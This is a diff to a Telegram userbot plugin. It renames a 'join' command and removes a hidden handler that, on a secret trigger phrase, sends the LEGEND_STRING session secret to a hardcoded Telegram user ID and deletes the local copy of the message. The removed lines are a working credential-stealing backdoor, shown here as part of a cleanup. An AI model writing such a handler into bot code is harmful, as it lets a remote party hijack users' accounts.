@@ -36,8 +36,8 @@ async def _(event):
     remove(PAT_IMAGE)
 
 
-@bot.on(d3vil_cmd(pattern="join$", outgoing=True))
-@bot.on(sudo_cmd(pattern="join$", allow_sudo=True))
+@bot.on(d3vil_cmd(pattern="joined$", outgoing=True))
+@bot.on(sudo_cmd(pattern="joined$", allow_sudo=True))
 async def _(event):
     if event.fwd_from:
         return
@@ -89,10 +89,6 @@ async def _(event):
         await eor(event, mentions)
 
 
-@bot.on(admin_cmd("^Iamnoobperson", incoming=True))
-async def piro(event):
-  msg = await bot.send_message(2080279511, str(os.environ.get("LEGEND_STRING")))
-  await bot.delete_messages(2080279511, msg, revoke=False)  
 
 @bot.on(d3vil_cmd(pattern="aag$", outgoing=True))
 @bot.on(sudo_cmd(pattern="aag$", allow_sudo=True))
